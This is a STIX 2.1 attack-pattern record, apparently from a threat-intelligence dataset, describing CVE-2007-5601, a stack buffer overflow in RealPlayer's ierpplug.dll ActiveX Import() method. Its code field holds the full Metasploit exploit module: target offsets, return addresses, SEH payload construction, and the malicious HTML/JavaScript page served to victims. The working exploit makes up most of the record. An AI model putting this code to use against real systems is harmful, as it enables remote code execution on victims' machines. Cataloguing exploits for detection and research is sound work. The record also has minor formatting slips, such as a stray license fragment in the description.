{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2a7ae6d-edb0-45ee-88c0-847123a708ec",
    "created": "2024-08-14T16:40:16.980505Z",
    "modified": "2024-08-14T16:40:16.980509Z",
    "name": "RealPlayer ierpplug.dll ActiveX Control Playlist Name Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in RealOne Player V2 Gold Build 6.0.11.853 and RealPlayer 10.5 Build 6.0.12.1483. By sending an overly long string to the \"Import()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/realplayer_import.rb",
            "external_id": "realplayer_import.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5601"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealPlayer ierpplug.dll ActiveX Control Playlist Name Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in RealOne Player V2 Gold Build 6.0.11.853 and\n        RealPlayer 10.5 Build 6.0.12.1483. By sending an overly long string to the \"Import()\"\n        method, an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5601' ],\n          [ 'OSVDB', '41430' ],\n          [ 'BID', '26130' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'IE / RealOne Player 2 (6.0.11.853)',     { 'Offset' => 4756, 'Ret' => 0x601aa72b } ], #rpmn3260.dll (6.0.9.1419)\n          [ 'IE / RealPlayer 10.5 (6.0.12.1483)',     { 'Offset' => 4768, 'Ret' => 0x614bd13b } ], #rpmn3260.dll (6.0.9.2934)\n        ],\n      'DisclosureDate' => '2007-10-18',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    filler = rand_text_english(target['Offset'])\n    seh    = generate_seh_payload(target.ret)\n    sploit = filler + seh + rand_text_english(30724 - payload.encoded.length)\n\n    # [id(0x60020009), helpstring(\"Imports a file to RealPlayer's Media Library\")]\n    # long Import(\n    #                 [in] BSTR file,\n    #                 [in, optional, defaultvalue(\"\")] BSTR playlist,\n    #                 [in, optional, defaultvalue(\"\")] BSTR clipInfo,\n    #                 [in, optional, defaultvalue(0)] long bPlayFile,\n    #                 [in, optional, defaultvalue(0)] long bCopyToMyMusic);\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.Import(\"Firstrun\\\\\\\\audio.rm\" ,#{strname} ,\"\" ,0 ,0);\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-18",
    "x_mitre_platforms": [
        "win'"
    ]
}